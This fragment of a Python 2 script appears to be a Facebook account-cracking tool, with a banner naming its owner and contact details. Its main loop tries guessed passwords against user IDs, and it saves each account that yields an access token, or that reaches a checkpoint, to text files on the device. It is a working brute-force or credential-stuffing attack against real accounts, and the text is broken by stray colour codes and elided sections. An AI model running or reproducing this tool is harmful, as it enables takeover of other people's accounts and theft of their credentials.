...
\033[1;91m>#FF00E1 OWNER      () RYNATHID
\033[1;95#FF00C8m> FACEBOOK   () JUDICAEL RYNATHID
\033[1;32m> W#FF00CBHATSAPP   () +261329780402
\033[1;96m#FF00CE> LIFE STATUS() SINGLE ALONEBOY
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[RINAT-SUCCESSFUL]  USER :  ' + k + c + user + ' PASSWORD : ' + pass1
                okb = open('sdcard/ids/successful.txt', 'a')
                okb.write(q['uid'] + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;91m[RINAT-CHECKPOINT]\x1b[0;97m] USER : ' + k + c + user + ' PASSWORD :  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[RINAT-SUCCESSFUL]  USER :  ' + k + c + user + ' PASSWORD : ' + pass2
                    okb = open('sdcard/ids/successful.txt', 'a')
                    okb.write(q['uid'] + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;91m[RIN#FF1D00AT-CHECKPOINT]\x1b[0;97m] USER : ' + k + c + user + ' PASSWORD :  ' + pass2
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
